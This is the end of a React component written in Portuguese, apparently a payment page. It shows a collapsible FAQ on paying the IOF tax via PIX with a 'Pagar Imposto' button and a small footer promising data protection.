                Como realizar o pagamento do (IOF)?
              </button>
              <div className="hidden mt-2 p-3 text-sm text-gray-600 border-l-4 border-blue-500 bg-gray-50" style={{ fontFamily: 'Inter, sans-serif' }}>
                Clique no botão <strong>'Pagar Imposto'</strong> e siga as instruções para realizar o pagamento via PIX. O processo é rápido e seguro.
              </div>
            </div>
            
            <div>
              <button 
                className="w-full text-left font-medium text-gray-800 text-base p-3 bg-white border border-gray-300 rounded hover:bg-gray-100 transition-colors"
                style={{ fontFamily: 'Inter, sans-serif' }}
                onClick={(e) => {
                  const answer = e.currentTarget.nextElementSibling as HTMLElement;
                  if (answer) {
                    answer.style.display = answer.style.display === 'block' ? 'none' : 'block';
                  }
                }}
              >
                <strong>NÃO</strong> consigo clicar no botão de <strong>'Pagar Imposto'</strong>. O que devo fazer?
              </button>
              <div className="hidden mt-2 p-3 text-sm text-gray-600 border-l-4 border-blue-500 bg-gray-50" style={{ fontFamily: 'Inter, sans-serif' }}>
                Certifique-se de ter marcado a opção de <strong>"Concordo com os termos e condições"</strong>, localizado logo <strong>acima do botão.</strong> Após isso, o botão será <strong>habilitado automaticamente.</strong>
              </div>
            </div>
          </div>
        </div>

        {/* Segurança */}
        <div className="mt-6 flex items-center justify-center space-x-2 text-xs text-gray-500">
          <Shield className="w-3 h-3 text-green-500" />
          <span>Dados protegidos • Processamento instantâneo</span>
        </div>
      </div>
    </div>
  );
};